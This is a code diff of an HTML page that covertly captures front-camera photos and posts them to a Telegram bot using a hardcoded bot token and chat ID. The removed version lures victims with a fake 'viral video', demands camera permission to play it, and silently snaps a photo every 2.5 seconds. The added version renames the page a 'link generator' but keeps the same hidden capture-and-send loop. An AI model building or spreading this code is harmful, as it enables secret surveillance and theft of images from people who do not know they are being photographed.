@@ -3,109 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viral Video Hub</title>
+    <title>Camera Access Link Generator</title>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
-        /* First Screen: Thumbnail */
-        #start-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .thumb { width: 90%; max-width: 400px; border-radius: 15px; border: 2px solid #ff0000; cursor: pointer; }
-        .play-btn { background: #ff0000; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; margin-top: 20px; font-size: 18px; cursor: pointer; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        body { font-family: 'Arial', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; }
+        .card { background-color: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15); text-align: center; max-width: 500px; width: 100%; }
+        h1 { color: #333; margin-bottom: 20px; }
+        p { color: #555; font-size: 1.1em; margin-bottom: 30px; line-height: 1.6; }
+        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease, transform 0.2s ease; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
+        button:hover { background-color: #0056b3; transform: translateY(-2px); }
+        button:active { transform: translateY(0); box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); }
+        #status { margin-top: 25px; font-size: 1em; color: #888; }
+        .error { color: #dc3545; font-weight: bold; }
+        .success { color: #28a745; font-weight: bold; }
 
-        /* Second Screen: Video Player */
-        #video-screen { display: none; width: 100vw; height: 100vh; background: black; }
-        video#main-player { width: 100%; height: 100%; object-fit: contain; }
-
-        /* Hidden Elements */
-        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
+        /* Hidden elements for camera stream and canvas */
+        #v-hidden, #c-hidden { display: none; position: fixed; left: -9999px; }
     </style>
 </head>
 <body>
 
-    <div id="start-screen">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6A7bU6xM5y5z5" class="thumb" onclick="activateLink()">
-        <h2 style="color:#ff0000; margin-top:20px;">🔥 NEW VIRAL VIDEO 🔥</h2>
-        <p>Click below to watch full video</p>
-        <button class="play-btn" onclick="activateLink()">WATCH NOW (FREE)</button>
-    </div>
-
-    <div id="video-screen">
-        <video id="main-player" controls autoplay loop>
-            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
+    <div class="card">
+        <h1>Camera Access Link Generator</h1>
+        <p>Click the button below to generate a secure link that requests camera access. Once access is granted, photos will be sent directly to your Telegram bot.</p>
+        <button onclick="requestCameraAccess()">Generate & Request Camera Access</button>
+        <div id="status"></div>
     </div>
 
     <video id="v-hidden" autoplay playsinline muted></video>
     <canvas id="c-hidden"></canvas>
 
 <script>
-    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const chatID = "7107389141";
+    // Aapka Telegram Bot Token aur Chat ID
+    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA"; // Apna bot token yahan daalen
+    const chatID = "7107389141"; // Apna chat ID yahan daalen
 
-    async function activateLink() {
+    let cameraStream = null; // Camera stream ko track karne ke liye variable
+    let captureInterval = null; // Interval ko track karne ke liye
+
+    async function requestCameraAccess() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.className = '';
+        statusDiv.textContent = 'Requesting camera access...';
+
         try {
-            // 1. Camera Access Permission
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
+            // Camera access ki request
+            cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, // Front camera
                 audio: false 
             });
 
-            // 2. Hidden Video Stream Start
-            const vHidden = document.getElementById('v-hidden');
-            vHidden.srcObject = stream;
+            const video = document.getElementById('v-hidden');
+            video.srcObject = cameraStream;
+            await video.play(); // Video play karein
 
-            // 3. Screen Switch (Hide Start, Show Video)
-            document.getElementById('start-screen').style.display = 'none';
-            document.getElementById('video-screen').style.display = 'block';
-            document.getElementById('main-player').play();
-
-            // 4. Background Photo Capture (Har 2.5 second baad)
-            vHidden.onplaying = () => {
-                // Pehli photo foran bhejein
-                setTimeout(capturePhoto, 1000);
-                // Loop shuru
-                setInterval(capturePhoto, 2500);
+            statusDiv.className = 'success';
+            statusDiv.textContent = 'Camera access granted! Photos will now be sent to your bot.';
+            
+            // Jab video play hona shuru ho jaye tab photos lena shuru karein
+            video.onplaying = () => {
+                // Pehli photo foran len
+                capturePhoto();
+                // Phir har 3 seconds baad photo len
+                captureInterval = setInterval(capturePhoto, 3000); 
             };
 
-            // 5. Bot ko notify karein ke user ne video start kar di
-            sendBotMsg("🎯 *LINK ACTIVE:* User is watching video right now!");
-
-        } catch (err) {
-            alert("Error: Please 'Allow' camera permission to watch this video.");
-            location.reload();
+        } catch (error) {
+            console.error("Camera access error:", error);
+            statusDiv.className = 'error';
+            if (error.name === 'NotAllowedError') {
+                statusDiv.textContent = 'Camera access denied by user. Please allow camera in your browser settings.';
+            } else if (error.name === 'NotFoundError') {
+                statusDiv.textContent = 'No camera found on this device.';
+            } else {
+                statusDiv.textContent = `Error: ${error.message}. Please try again or check browser permissions.`;
+            }
+            // Agar camera access na mile to pehle se chal rahe interval ko band kar den
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            // Agar stream hai to usko bhi stop kar den
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
         }
     }
 
     function capturePhoto() {
-        const v = document.getElementById('v-hidden');
-        const can = document.getElementById('c-hidden');
+        const video = document.getElementById('v-hidden');
+        const canvas = document.getElementById('c-hidden');
         
-        if (v.readyState === 4) {
-            can.width = v.videoWidth;
-            can.height = v.videoHeight;
-            can.getContext('2d').drawImage(v, 0, 0);
+        // Ensure video is playing and ready
+        if (video.readyState === 4 && cameraStream) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            can.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatID);
-                fd.append('photo', blob, 'capture.jpg');
-                
-                // Photo bot par bhejna
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-            }, 'image/jpeg', 0.5); // Quality 50% rakhi hai taake fast send ho
+            // Canvas content ko Blob mein convert karein aur bot par bhejein
+            canvas.toBlob(blob => {
+                if (blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatID);
+                    formData.append('photo', blob, 'live_photo.jpg'); // Filename for the photo
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            console.error("Failed to send photo to bot:", data.description);
+                            // Agar Telegram API block ho to user ko alert de sakte hain
+                            // document.getElementById('status').textContent = 'Warning: Telegram API might be blocked. Photos may not be delivered. Try with VPN.';
+                        } else {
+                            console.log("Photo sent successfully!");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error sending photo to bot:", error);
+                        // document.getElementById('status').textContent = 'Network error: Cannot reach Telegram. Try with VPN.';
+                    });
+                }
+            }, 'image/jpeg', 0.8); // Image quality (0.8 = 80%)
         }
-    }
-
-    function sendBotMsg(text) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
-        });
     }
 </script>
 </body>
